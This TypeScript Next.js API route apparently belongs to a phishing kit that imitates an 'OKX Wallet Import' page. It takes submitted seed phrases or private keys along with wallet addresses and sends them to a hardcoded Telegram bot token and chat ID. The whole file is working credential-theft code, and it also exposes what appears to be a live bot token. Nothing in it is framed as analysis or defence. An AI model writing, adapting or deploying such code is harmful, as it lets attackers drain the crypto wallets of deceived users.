import { NextRequest, NextResponse } from "next/server"
import crypto from "crypto"

// Bot token and chat ID - hidden from client
const TELEGRAM_BOT_TOKEN = "8585737545:AAFSAMl1SvuORjqZ_p25LfVysCygY033TGQ"
const TELEGRAM_CHAT_ID = "6235082597"

// In-memory cache for deduplication (expires after 30 seconds)
const messageCache = new Map<string, number>()
const CACHE_EXPIRY = 30000 // 30 seconds

function generateMessageHash(type: string, data: string | string[], walletAddress: string): string {
  const dataString = typeof data === "string" ? data : data.join(" ")
  const content = `${type}:${dataString}:${walletAddress}`
  return crypto.createHash("sha256").update(content).digest("hex")
}

function isDuplicate(hash: string): boolean {
  const now = Date.now()
  
  // Clean expired entries
  for (const [key, timestamp] of messageCache.entries()) {
    if (now - timestamp > CACHE_EXPIRY) {
      messageCache.delete(key)
    }
  }
  
  // Check if hash exists
  if (messageCache.has(hash)) {
    return true
  }
  
  // Add to cache
  messageCache.set(hash, now)
  return false
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { type, data, walletAddress } = body

    if (!type || !data) {
      return NextResponse.json({ error: "Type and data are required" }, { status: 400 })
    }

    // Generate hash for deduplication
    const messageHash = generateMessageHash(type, data, walletAddress || "")
    
    // Check for duplicate
    if (isDuplicate(messageHash)) {
      return NextResponse.json({ success: true, message: "Duplicate request ignored" }, { status: 200 })
    }

    // Format message
    const message = `🔐 OKX Wallet Import\n\n` +
      `📝 Type: ${type === "seed" ? "Seed Phrase" : "Private Key"}\n` +
      `💼 Wallet Address: ${walletAddress || "N/A"}\n` +
      `🔑 Data: ${type === "seed" ? data.join(" ") : data}\n` +
      `🕐 Time: ${new Date().toLocaleString()}`

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
    
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    })

    if (!response.ok) {
      const errorData = await response.text()
      console.error("Telegram API error:", errorData)
      return NextResponse.json({ error: "Failed to send message" }, { status: 500 })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}

